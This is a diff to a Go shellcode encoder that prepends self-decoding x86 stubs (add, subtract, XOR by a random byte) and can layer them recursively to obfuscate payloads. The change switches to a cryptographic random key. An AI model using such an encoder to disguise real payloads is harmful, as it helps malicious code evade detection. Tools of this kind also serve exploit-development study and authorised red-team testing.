@@ -1,6 +1,7 @@
 package main
 
 import (
+	crand "crypto/rand"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -9,7 +10,16 @@ import (
 	"time"
 )
 
-func add(shellcode []byte, randomByte int) []byte {
+func genRandomByte() byte {
+	randomByte := make([]byte, 1)
+	for randomByte[0] == 0x0 {
+		_, err := crand.Read(randomByte)
+		check(err)
+	}
+	return randomByte[0]
+}
+
+func add(shellcode []byte, randomByte byte) []byte {
 	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x6c\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
 	decoder[6] = byte(len(shellcode))
 	decoder[11] = byte(randomByte)
@@ -20,7 +30,7 @@ func add(shellcode []byte, randomByte int) []byte {
 	return append(decoder, shellcode...)
 }
 
-func sub(shellcode []byte, randomByte int) []byte {
+func sub(shellcode []byte, randomByte byte) []byte {
 	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x44\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
 	decoder[6] = byte(len(shellcode))
 	decoder[11] = byte(randomByte)
@@ -31,7 +41,7 @@ func sub(shellcode []byte, randomByte int) []byte {
 	return append(decoder, shellcode...)
 }
 
-func xor(shellcode []byte, randomByte int) []byte {
+func xor(shellcode []byte, randomByte byte) []byte {
 	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x74\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
 	decoder[6] = byte(len(shellcode))
 	decoder[11] = byte(randomByte)
@@ -67,7 +77,7 @@ func printShellcode(shellcode []byte) {
 }
 
 func random(shellcode []byte) []byte {
-	randomByte := rand.Intn(255) + 1
+	randomByte := genRandomByte()
 	method := rand.Intn(4)
 	if method == 0 {
 		fmt.Printf("[+] Add method (0x%x)\n", randomByte)
@@ -92,9 +102,10 @@ func check(e error) {
 }
 
 func crazy(shellcode []byte) []byte {
+	rand.Seed(time.Now().UTC().UnixNano())
 	order := rand.Perm(4)
 	for i := range order {
-		randomByte := rand.Intn(255) + 1
+		randomByte := genRandomByte()
 		if i == 0 {
 			shellcode = add(shellcode, randomByte)
 			fmt.Printf("[+] Add method (0x%x)\n", randomByte)
@@ -144,8 +155,7 @@ func main() {
 
 	banner()
 
-	rand.Seed(time.Now().UnixNano())
-	randomByte := rand.Intn(255) + 1
+	randomByte := genRandomByte()
 
 	argBrainless := flag.Uint("brainless", 0, "Specify the number of recursive encapsulated obfuscation methods")
 	argCrazy := flag.Bool("crazy", false, "Recursively obfuscate the shellcode with all methods")
